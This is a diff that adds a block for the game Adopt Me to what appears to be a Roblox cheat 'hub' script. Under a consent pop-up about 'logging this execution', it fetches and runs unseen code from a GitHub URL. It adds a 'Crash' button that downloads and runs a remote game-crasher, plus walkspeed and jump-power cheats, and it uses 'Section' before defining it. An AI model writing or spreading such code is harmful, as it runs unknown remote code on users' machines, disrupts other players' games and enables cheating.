@@ -5813,8 +5813,79 @@ ExtraSectionOP:NewButton("ESP Pigs", "ESP", function()
     esp.Parent = Enemy4
 end)
 
+elseif PlaceId == 920587237 then
 
+                function Callback(answer)
+        if answer == "Yes!" then
+            local Bindable = Instance.new("BindableFunction")
+            Bindable.OnInvoke = Callback
+    
+            game.StarterGui:SetCore("SendNotification", {
+                Title = "Logged";
+             Text = "Thank you for your contribution!";
+                Duration = 10;
+                Icon = "rbxassetid://7635712200";
+                Callback = Bindable
+            })
+            
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/LuxeCommands/L/main/e'))()
+            print("logged!")
+        elseif answer == "Ew, no!" then
+            local Bindable = Instance.new("BindableFunction")
+            Bindable.OnInvoke = Callback
+    
+            game.StarterGui:SetCore("SendNotification", {
+                Title = "Not Logged";
+             Text = "Sorry for bothering you!";
+                Duration = 15;
+                Icon = "rbxassetid://7635712200";
+                Callback = Bindable
+            })
+        end
+    end
+    
+    local Bindable = Instance.new("BindableFunction")
+    Bindable.OnInvoke = Callback
+    
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "Logging";
+        Text = "Can we log this execution for data purposes?";
+        Duration = 60;
+        Button1 = "Yes!";
+        Button2 = "Ew, no!";
+        Icon = "rbxassetid://7635712200";
+        Callback = Bindable
+    })
 
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Adopt Me | Ryku Hub", "Synapse")
+--Main--
+local MainTab = Window:NewTab("Crash")
+local MainSection = MainTab:NewSection("Crash")
+Section:NewLabel("Not Made By Me!")
+Section:NewButton("Adopt Me Crash", "Crashes Adopt Me, Duh", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/Amity/main/AdoptMeCrasher.lua"))()
+end)
+
+    local Tab = Window:NewTab("Local Player")
+
+    local Section = Tab:NewSection("Local Player")
+    
+    Section:NewSlider("Walkspeed", "Changes your Walkspeed", 300, 16, function(s)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+    end)
+    
+    Section:NewSlider("Jump Power", "Changes your Jump Power", 500, 50, function(f)
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = f
+    end)
+    
+    local Tab = Window:NewTab("Settings")
+    
+    local Section = Tab:NewSection("Settings")
+    
+    Section:NewKeybind("Open/Close GUI", "To Open And Close Gui, Duh", Enum.KeyCode.V, function()
+        Library:ToggleUI()
+    end)
 
 
 
